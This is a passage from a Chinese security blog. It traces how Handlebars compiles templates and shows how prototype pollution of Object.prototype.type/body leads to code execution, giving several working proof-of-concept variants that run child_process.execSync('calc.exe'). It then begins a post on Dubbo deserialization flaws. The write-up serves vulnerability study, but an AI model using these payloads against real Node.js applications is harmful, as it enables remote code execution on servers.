&#125;,</span><br></pre></td></tr></table></figure>

<p>在执行最后的<code>append</code>操作的时候会将<code>inlineStack</code>中的内容pop出来加入到<code>Source</code>中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">append</span>: <span class="keyword">function</span> <span class="title function_">append</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">isInline</span>()) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">replaceStack</span>(<span class="keyword">function</span> (<span class="params">current</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27; != null ? &#x27;</span>, current, <span class="string">&#x27; : &quot;&quot;&#x27;</span>];</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">pushSource</span>(<span class="variable language_">this</span>.<span class="title function_">appendToBuffer</span>(<span class="variable language_">this</span>.<span class="title function_">popStack</span>()));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> local = <span class="variable language_">this</span>.<span class="title function_">popStack</span>();</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">pushSource</span>([<span class="string">&#x27;if (&#x27;</span>, local, <span class="string">&#x27; != null) &#123; &#x27;</span>, <span class="variable language_">this</span>.<span class="title function_">appendToBuffer</span>(local, <span class="literal">undefined</span>, <span class="literal">true</span>), <span class="string">&#x27; &#125;&#x27;</span>]);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">environment</span>.<span class="property">isSimple</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">pushSource</span>([<span class="string">&#x27;else &#123; &#x27;</span>, <span class="variable language_">this</span>.<span class="title function_">appendToBuffer</span>(<span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="literal">undefined</span>, <span class="literal">true</span>), <span class="string">&#x27; &#125;&#x27;</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>这里是创建函数体上下文，将<code>source</code>中的东西转换成字符串函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">createFunctionContext</span>: <span class="keyword">function</span> <span class="title function_">createFunctionContext</span>(<span class="params">asObject</span>) &#123;</span><br><span class="line">    <span class="comment">// istanbul ignore next</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> _this = <span class="variable language_">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> varDeclarations = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> locals = <span class="variable language_">this</span>.<span class="property">stackVars</span>.<span class="title function_">concat</span>(<span class="variable language_">this</span>.<span class="property">registers</span>.<span class="property">list</span>);</span><br><span class="line">    <span class="keyword">if</span> (locals.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      varDeclarations += <span class="string">&#x27;, &#x27;</span> + locals.<span class="title function_">join</span>(<span class="string">&#x27;, &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate minimizer alias mappings</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// When using true SourceNodes, this will update all references to the given alias</span></span><br><span class="line">    <span class="comment">// as the source nodes are reused in situ. For the non-source node compilation mode,</span></span><br><span class="line">    <span class="comment">// aliases will not be used, but this case is already being run on the client and</span></span><br><span class="line">    <span class="comment">// we aren&#x27;t concern about minimizing the template size.</span></span><br><span class="line">    <span class="keyword">var</span> aliasCount = <span class="number">0</span>;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="variable language_">this</span>.<span class="property">aliases</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">alias</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> node = _this.<span class="property">aliases</span>[alias];</span><br><span class="line">      <span class="keyword">if</span> (node.<span class="property">children</span> &amp;&amp; node.<span class="property">referenceCount</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        varDeclarations += <span class="string">&#x27;, alias&#x27;</span> + ++aliasCount + <span class="string">&#x27;=&#x27;</span> + alias;</span><br><span class="line">        node.<span class="property">children</span>[<span class="number">0</span>] = <span class="string">&#x27;alias&#x27;</span> + aliasCount;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">lookupPropertyFunctionIsUsed</span>) &#123;</span><br><span class="line">      varDeclarations += <span class="string">&#x27;, &#x27;</span> + <span class="variable language_">this</span>.<span class="title function_">lookupPropertyFunctionVarDeclaration</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> params = [<span class="string">&#x27;container&#x27;</span>, <span class="string">&#x27;depth0&#x27;</span>, <span class="string">&#x27;helpers&#x27;</span>, <span class="string">&#x27;partials&#x27;</span>, <span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">useBlockParams</span> || <span class="variable language_">this</span>.<span class="property">useDepths</span>) &#123;</span><br><span class="line">      params.<span class="title function_">push</span>(<span class="string">&#x27;blockParams&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">useDepths</span>) &#123;</span><br><span class="line">      params.<span class="title function_">push</span>(<span class="string">&#x27;depths&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform a second pass over the output to merge content when possible</span></span><br><span class="line">    <span class="keyword">var</span> source = <span class="variable language_">this</span>.<span class="title function_">mergeSource</span>(varDeclarations); <span class="comment">// 把原本的source和varDeclarations拼接起来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asObject) &#123;</span><br><span class="line">      params.<span class="title function_">push</span>(source);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Function</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, params);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">source</span>.<span class="title function_">wrap</span>([<span class="string">&#x27;function(&#x27;</span>, params.<span class="title function_">join</span>(<span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;) &#123;\n  &#x27;</span>, source, <span class="string">&#x27;&#125;&#x27;</span>]); <span class="comment">// 将source封装成函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<h4 id="生成模板"><a href="#生成模板" class="headerlink" title="生成模板"></a>生成模板</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">compileInput</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ast = env.<span class="title function_">parse</span>(input, options), </span><br><span class="line">        environment = <span class="keyword">new</span> env.<span class="title class_">Compiler</span>().<span class="title function_">compile</span>(ast, options),</span><br><span class="line">        templateSpec = <span class="keyword">new</span> env.<span class="title class_">JavaScriptCompiler</span>().<span class="title function_">compile</span>(environment, options, <span class="literal">undefined</span>, <span class="literal">true</span>); </span><br><span class="line">    <span class="keyword">return</span> env.<span class="title function_">template</span>(templateSpec); <span class="comment">// 生成模板</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars.runtime.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">create</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> hb = <span class="keyword">new</span> base.<span class="title class_">HandlebarsEnvironment</span>();</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Utils</span>.<span class="title function_">extend</span>(hb, base);</span><br><span class="line">  hb.<span class="property">SafeString</span> = _handlebarsSafeString2[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">  hb.<span class="property">Exception</span> = _handlebarsException2[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">  hb.<span class="property">Utils</span> = <span class="title class_">Utils</span>;</span><br><span class="line">  hb.<span class="property">escapeExpression</span> = <span class="title class_">Utils</span>.<span class="property">escapeExpression</span>;</span><br><span class="line"></span><br><span class="line">  hb.<span class="property">VM</span> = runtime;</span><br><span class="line">  hb.<span class="property">template</span> = <span class="keyword">function</span> (<span class="params">spec</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> runtime.<span class="title function_">template</span>(spec, hb);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="模板函数执行"><a href="#模板函数执行" class="headerlink" title="模板函数执行"></a>模板函数执行</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ret</span>(<span class="params">context, execOptions</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!compiled) &#123;</span><br><span class="line">      compiled = <span class="title function_">compileInput</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> compiled.<span class="title function_">call</span>(<span class="variable language_">this</span>, context, execOptions); <span class="comment">// 执行函数获取返回值</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\runtime.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ret</span>(<span class="params">context</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> options = <span class="variable language_">arguments</span>.<span class="property">length</span> &lt;= <span class="number">1</span> || <span class="variable language_">arguments</span>[<span class="number">1</span>] === <span class="literal">undefined</span> ? &#123;&#125; : <span class="variable language_">arguments</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> data = options.<span class="property">data</span>;</span><br><span class="line"></span><br><span class="line">    ret.<span class="title function_">_setup</span>(options);</span><br><span class="line">    <span class="keyword">if</span> (!options.<span class="property">partial</span> &amp;&amp; templateSpec.<span class="property">useData</span>) &#123;</span><br><span class="line">      data = <span class="title function_">initData</span>(context, data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> depths = <span class="literal">undefined</span>,</span><br><span class="line">        blockParams = templateSpec.<span class="property">useBlockParams</span> ? [] : <span class="literal">undefined</span>;</span><br><span class="line">    <span class="keyword">if</span> (templateSpec.<span class="property">useDepths</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (options.<span class="property">depths</span>) &#123;</span><br><span class="line">        depths = context != options.<span class="property">depths</span>[<span class="number">0</span>] ? [context].<span class="title function_">concat</span>(options.<span class="property">depths</span>) : options.<span class="property">depths</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        depths = [context];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params">context <span class="comment">/*, options*/</span></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> + templateSpec.<span class="title function_">main</span>(container, context, container.<span class="property">helpers</span>, container.<span class="property">partials</span>, data, blockParams, depths); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    main = <span class="title function_">executeDecorators</span>(templateSpec.<span class="property">main</span>, main, container, options.<span class="property">depths</span> || [], data, blockParams); <span class="comment">// 对main函数进行装饰</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">main</span>(context, options); <span class="comment">// 执行main函数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="被污染的函数"><a href="#被污染的函数" class="headerlink" title="被污染的函数"></a>被污染的函数</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> <span class="title function_">anonymous</span>(<span class="params">container,depth0,helpers,partials,data</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> stack1, lookupProperty = container.<span class="property">lookupProperty</span> || <span class="keyword">function</span>(<span class="params">parent, propertyName</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(parent, propertyName)) &#123;</span><br><span class="line">          <span class="keyword">return</span> parent[propertyName];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((stack1 = (<span class="title function_">lookupProperty</span>(helpers,<span class="string">&quot;undefined&quot;</span>)||(depth0 &amp;&amp; <span class="title function_">lookupProperty</span>(depth0,<span class="string">&quot;undefined&quot;</span>))||container.<span class="property">hooks</span>.<span class="property">helperMissing</span>).<span class="title function_">call</span>(depth0 != <span class="literal">null</span> ? depth0 : (container.<span class="property">nullContext</span> || &#123;&#125;),<span class="variable language_">console</span>.<span class="title function_">log</span>(process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;calc.exe&#x27;</span>).<span class="title function_">toString</span>()),&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;undefined&quot;</span>,<span class="string">&quot;hash&quot;</span>:&#123;&#125;,<span class="string">&quot;data&quot;</span>:data,<span class="string">&quot;loc&quot;</span>:&#123;<span class="string">&quot;start&quot;</span>:<span class="number">0</span>,<span class="string">&quot;end&quot;</span>:<span class="number">0</span>&#125;&#125;)) != <span class="literal">null</span> ? stack1 : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li><p>漏洞核心在于污染编译过程中的<code>pushLiteral</code>操作，其中可以用到<code>NumberLiteral</code>类型和<code>BooleanLiteral</code>类型</p>
</li>
<li><p>令<code>type</code>为<code>Program</code>绕过<code>Lexer</code>解析器，从<code>compiler.js</code>找到可用的<code>Gadget</code></p>
</li>
<li><p>在寻找<code>Gadget</code>时注意保持语法树的栈平衡，不然会在编译的时候抛出如下错误，这也是为什么我们需要借助<code>MustacheStatement</code>类型注入我们的payload，而不能直接将<code>NumberLiteral</code>注入到<code>body</code>中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* istanbul ignore next */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">stackSlot</span> || <span class="variable language_">this</span>.<span class="property">inlineStack</span>.<span class="property">length</span> || <span class="variable language_">this</span>.<span class="property">compileStack</span>.<span class="property">length</span>) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Compile completed with content left on stack&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="BooleanLiteral"><a href="#BooleanLiteral" class="headerlink" title="BooleanLiteral"></a>BooleanLiteral</h4><p>将<code>NumberLiteral</code>替换为<code>BooleanLiteral</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;MustacheStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;BooleanLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: &#123; <span class="string">&quot;start&quot;</span>: <span class="number">0</span> &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>

<h4 id="PartialStatement"><a href="#PartialStatement" class="headerlink" title="PartialStatement"></a>PartialStatement</h4><p>将<code>MustacheStatement</code>改为<code>PartialStatement</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;PartialStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>

<h4 id="PartialBlockStatement"><a href="#PartialBlockStatement" class="headerlink" title="PartialBlockStatement"></a>PartialBlockStatement</h4><p>将<code>MustacheStatement</code>改为<code>PartialBlockStatement</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;PartialBlockStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;openStrip&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;closeStrip&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;program&quot;</span>: &#123; <span class="string">&quot;body&quot;</span>: <span class="number">0</span> &#125;,</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>

<h4 id="BlockStatement"><a href="#BlockStatement" class="headerlink" title="BlockStatement"></a>BlockStatement</h4><p>将<code>MustacheStatement</code>改为<code>BlockStatement</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;BlockStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;openStrip&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;closeStrip&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;program&quot;</span>: &#123; <span class="string">&quot;body&quot;</span>: <span class="number">0</span> &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>

<h4 id="Decorator"><a href="#Decorator" class="headerlink" title="Decorator"></a>Decorator</h4><p>触发点和上面的有所差异，这个是在装饰<code>main</code>函数的时候插入自定义代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Decorator&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">	<span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: &#123; <span class="string">&quot;start&quot;</span>: <span class="number">0</span> &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>

<h4 id="inf-Hash"><a href="#inf-Hash" class="headerlink" title="inf Hash"></a>inf Hash</h4><p>无限内嵌<code>Hash</code>类型</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;MustacheStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Hash&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pairs&quot;</span>: [&#123;</span><br><span class="line">            <span class="string">&quot;value&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Hash&quot;</span>,</span><br><span class="line">                <span class="string">&quot;pairs&quot;</span>: [&#123;</span><br><span class="line">                    <span class="string">&quot;value&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">                &#125;&#125;]</span><br><span class="line">        &#125;&#125;]</span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: &#123; <span class="string">&quot;start&quot;</span>: <span class="number">0</span> &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>



<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Dubbo反序列化漏洞研究</title>
    <url>/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<blockquote>
<p>分析一下CVE-2019-17564和CVE-2020-1849两个漏洞</p>
</blockquote>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>简介</strong></p>
<p>Apache Dubbo是一个分布式框架，致力于提供高性能透明化的RPC远程服务调用方案，以及SOA服务治理方案。Apache Dubbo在实际应用场景中主要负责解决分布式的相关需求。</p>
<p><strong>dubbo</strong></p>
<p>dubbo支持多种序列化方式并且序列化是和协议相对应的。比如：Dubbo支持dubbo、rmi、Hessian、http、webservice、thrift、redis等多种协议。</p>
<p><strong>Hessian</strong></p>
<p>Hessian是一种跨语言的高效二进制序列化方式。但这里实际不是原生的Hessian2序列化，而是阿里修改过的Hessian lite，Hessian是二进制的web service协议，官方对Java、Flash&#x2F;Flex、Python、C++、.NET C#等多种语言都进行了实现。Hessian和Axis、XFire都能实现web service方式的远程方法调用，区别是Hessian是二进制协议，Axis、XFire则是SOAP协议，所以从性能上说Hessian远优于后两者，并且Hessian的JAVA使用方法非常简单。它使用Java语言接口定义了远程对象，集合了序列化&#x2F;反序列化和RMI功能。</p>
